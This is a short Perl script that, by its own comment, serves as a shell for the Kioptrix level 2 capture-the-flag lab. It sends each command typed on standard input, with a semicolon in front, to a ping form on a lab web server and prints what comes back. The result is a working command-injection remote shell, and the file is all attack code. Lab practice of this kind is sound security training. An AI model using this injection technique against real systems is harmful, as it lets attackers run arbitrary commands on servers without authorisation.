#!/usr/bin/perl
# Shell used for kioptrix challenge level 2

use HTTP::Request::Common qw(POST);
use LWP::UserAgent;

my $browser = LWP::UserAgent->new;
my $url = 'http://192.168.2.3/pingit.php';

while(1){
$command = <STDIN>;
chomp($command);
$command = ";".$command;

	my $formdata = ['ip'=> $command, 'submit' => 'Submit'];
	my $response = $browser->post($url, $formdata);
	die "Error: ", $response->status_line . "\n"
		unless print $response->content."\n";
}
